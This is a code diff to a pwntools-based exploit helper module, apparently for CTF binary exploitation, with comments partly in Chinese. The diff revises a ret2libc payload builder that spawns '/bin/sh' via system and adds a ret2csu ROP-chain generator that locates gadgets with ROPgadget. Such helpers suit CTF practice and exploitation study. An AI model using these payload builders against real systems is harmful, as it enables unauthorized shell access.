@@ -1,5 +1,6 @@
 from pwn import *
 import os
+import subprocess
 def get_output(s):
     info(f"running cmd: {s}")
     res = int(os.popen(s).readlines()[0][:-1],16)
@@ -66,8 +67,10 @@ def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret,loader):
     """
     psize = p32 if context.arch == 'i386' else p64
     libc_base = leak_addr - libc.symbols[to_leak]
-    system = libc_base + libc.symbols['system']
-    binsh  = libc_base + next(libc.search(b'/bin/sh'))
+    libc.address = libc_base
+    system = libc.symbols['system']
+    binsh  = next(libc.search(b'/bin/sh'))
+    
     info(f"system {hex(system)} ; binsh {hex(binsh)}")
     if context.arch == "i386":
         payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
@@ -81,7 +84,31 @@ def make_syscall():
     pass
 
 
+def ret2csu(func, edi, rsi, rdx, loader, csu_sym=None):
+    """
+    edi, rsi, rdx 是x64的前三个参数对应的寄存器
+    """
+    if not csu_sym:
+        cmd = f'ROPgadget --binary {loader.root} | grep "pop rdi ; ret"'
+        res = os.popen(cmd).readlines()[0][:-1].split(":")[0]
+        res = int(res,16)
+        # 4007c3 4007ba 4007a0
+        csu_p2, csu_p1 = res-(0xc3-0xba), res-(0xc3-0xa0)
+    else:
+        # 760 4007ba 4007a0
+        csu_p2, csu_p1 = csu_sym-(0x60-0xba), csu_sym-(0x60-0xa0)
+    # csu_p2 : pop rbx rbp r12 r13 r14 r15 retn
+    # csu_p1 : mov2 rdx rsi edi; call cmp jnz
+    # in p1:
+        # add rbx, 1
+        # cmp rbx, rbp
+        # jnz 不相等才循环
+    parts = [p64(i) for i in [csu_p2, 0, 1, func, rdx, rsi, edi, csu_p1]]
+    payload = b"".join(parts)
+    return payload
 
+
+    
 
 
 
